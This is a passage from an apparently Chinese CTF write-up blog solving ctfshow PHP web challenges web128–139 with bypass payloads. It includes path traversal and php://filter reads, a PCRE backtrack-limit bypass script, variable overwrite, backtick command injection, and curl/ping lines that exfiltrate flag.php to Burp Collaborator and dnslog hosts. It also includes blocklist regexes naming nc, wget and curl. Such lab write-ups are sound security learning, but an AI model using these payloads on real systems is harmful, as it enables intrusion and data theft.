<span class="literal">NULL</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>gettext扩展</p><p>在开启该拓展后 _() 等效于 gettext()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettext</span>(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line"><span class="comment">#结果  phpinfo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line"><span class="comment">#结果 phpinfo</span></span><br></pre></td></tr></table></figure><p>我们的flag在flag.php中,所以可以直接使用get_defined_vars</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_defined_vars ( void ) : array</span><br><span class="line">此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408202843331.png" alt="image-20220408202843331"></p><h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-13 03:18:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stripos() </span><br><span class="line">查找字符串在另一字符串中第一次出现的位置（不区分大小写）。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=http://url/xxx.txt?ctfshow</span><br><span class="line">?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php</span><br><span class="line">?f=../ctfshow/../../../../../../../../var/www/html/flag.php</span><br></pre></td></tr></table></figure><p>php支持多种编码方式,无效的自动被忽略</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408203126936.png" alt="image-20220408203126936"></p><h1 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="正则最大回溯次数绕过"><a href="#正则最大回溯次数绕过" class="headerlink" title="正则最大回溯次数绕过"></a>正则最大回溯次数绕过</h2><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><p>php为了防止正则表达式的拒绝服务攻击(reDOS),给pcre设置了一个回溯次数上限pcre.backtrack_limit回溯次数上限的默认是100万,如果回溯次数超过了100万,preg_match将不在返回非1和0,而是false,这样我们就能绕过第一个正则表达式了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://03771c3c-6afb-4457-a719-19cc6ccf922e.chall.ctf.show/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>但是这里也可以使用preg_match无法处理数组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">f[]=ctfshow</span><br></pre></td></tr></table></figure><p>还有这里的正则匹配是s表示多行</p><p>.+表示匹配一次或者多次任意字符,而?表示尽可能少的匹配到前面的字符也就是什么都不加就匹配不到,stripos会匹配到的话返回一个 int 始终不(&#x3D;&#x3D;&#x3D;)强等于 FALSE</p><p>所以什么都不加就匹配不到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">f=ctfshow</span><br></pre></td></tr></table></figure><h1 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-13 05:19:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://55fddafa-eb92-4a44-adc4-776cbe88c54a.challenge.ctf.show/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408203509348.png" alt="image-20220408203509348"></p><h1 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408203558726.png" alt="image-20220408203558726"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在网址后面输入&#x2F;admin进入源码界面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408203628575.png" alt="image-20220408203628575"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span> &amp;&amp; <span class="literal">false</span> || <span class="literal">true</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="comment">#123</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span> &amp;&amp; <span class="literal">true</span> || <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#123</span></span><br></pre></td></tr></table></figure><p>所以只需要</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;password=1&amp;code=admin</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408203704474.png" alt="image-20220408203704474"></p><h1 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">ctFshoW&#123;<span class="number">30</span>bF48c6-<span class="number">60</span>a1-<span class="number">4</span>dD4-ad20-bD9237778c4k</span><br></pre></td></tr></table></figure><p>如果我们传入的$F本身,会不会发生变量覆盖</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们传递?F=`$F`;+sleep 3好像网站确实sleep了一会说明确实执行了命令</span><br><span class="line">我们传递`$F`;+sleeo 3 先进行substr()函数截断然后去执行eval()函数,这个函数的作用就是执行php代码,``是shell_exec()函数的缩写,然后就去命令执行,而我$F就是我们输入的`$F`;+sleep 3使用最后执行的代码应该是``$F`;+sleep 3`,就执行成功</span><br></pre></td></tr></table></figure><p>然后就是利用curl去带出去flag.php</p><h2 id="Burp的-Collaborator-Client"><a href="#Burp的-Collaborator-Client" class="headerlink" title="Burp的 Collaborator Client"></a>Burp的 Collaborator Client</h2><p>curl -F 将文件上传到burp的collaborator client(功能类似dnslog,其功能要比dnslog强大,主要体现在可以查看post请求包以及打cookies)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F`;+curl -X POST -F xx=@flag.php  http://mnd5kc6807ukbpfu3nyqbf35xw3ord.burpcollaborator.net</span><br><span class="line">#其中-F 为带文件类型发送的POST请求</span><br><span class="line">#xx是上传文件的name值,falg.php就是上传文件</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408204550431.png" alt="image-20220408204550431"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408204558125.png" alt="image-20220408204558125"></p><h1 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: Firebasky</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-14 23:01:06</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extract() 函数从数组中将变量导入到当前的符号表。</span><br><span class="line"></span><br><span class="line">该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</span><br><span class="line">该函数返回成功设置的变量数目。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$a = &quot;Original&quot;;</span><br><span class="line">$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);</span><br><span class="line">extract($my_array);</span><br><span class="line">echo &quot;\$a = $a; \$b = $b; \$c = $c&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">$a = Cat; $b = Dog; $c = Horse </span><br></pre></td></tr></table></figure><p>post变量覆盖</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408210832723.png" alt="image-20220408210832723"></p><h1 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h1><h2 id="内联加变量覆盖"><a href="#内联加变量覆盖" class="headerlink" title="内联加变量覆盖"></a>内联加变量覆盖</h2><p><a href="http://www.dnslog.cn/">获得dns地址</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: Firebasky</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-16 18:48:03</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`$F`;+ping `cat flag.php|awk &#x27;NR==2&#x27;`.h25mgt.dnslog.cn</span><br></pre></td></tr></table></figure><p>上面这个不行哦,反正我的不行</p><p>不过既然能执行命令,那可选的方式就多了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F `;mv f* 1.txt重命名</span><br><span class="line">?F=`$F `;nl f*&gt;2.txt写文件</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410145822650.png" alt="image-20220410145822650"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410145947069.png" alt="image-20220410145947069"></p><h1 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h1><h2 id="linux的tree写文件"><a href="#linux的tree写文件" class="headerlink" title="linux的tree写文件"></a>linux的tree写文件</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>linux中还有其他命令写文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=ls|tee 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410150649258.png" alt="image-20220410150649258"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=ls /| tee 2</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410150759848.png" alt="image-20220410150759848"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=cat /f149_15_h3r3| tee 3</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410150903525.png" alt="image-20220410150903525"></p><h1 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h1><h2 id="调用静态方法"><a href="#调用静态方法" class="headerlink" title="::调用静态方法"></a>::调用静态方法</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-16 22:27:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">ctfshow=ctfshow::getflag</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php中 -&gt;与:: 调用类中的成员的区别</span><br><span class="line">-&gt;用于动态语境处理某个类的某个实例</span><br><span class="line">::可以调用一个静态的、不依赖于其他初始化的类方法.</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410151316044.png" alt="image-20220410151316044"></p><h1 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h1><h2 id="call-user-func-传数组"><a href="#call-user-func-传数组" class="headerlink" title="call_user_func()传数组"></a>call_user_func()传数组</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-16 22:52:13</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>call_user_func中不但可以传字符串也可以传数组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func(array($classname, &#x27;say_hello&#x27;));</span><br><span class="line">这时候会调用 classname中的 say_hello方法</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410151732692.png" alt="image-20220410151732692"></p><h1 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h1><h2 id="命令执行之盲注"><a href="#命令执行之盲注" class="headerlink" title="命令执行之盲注"></a>命令执行之盲注</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ 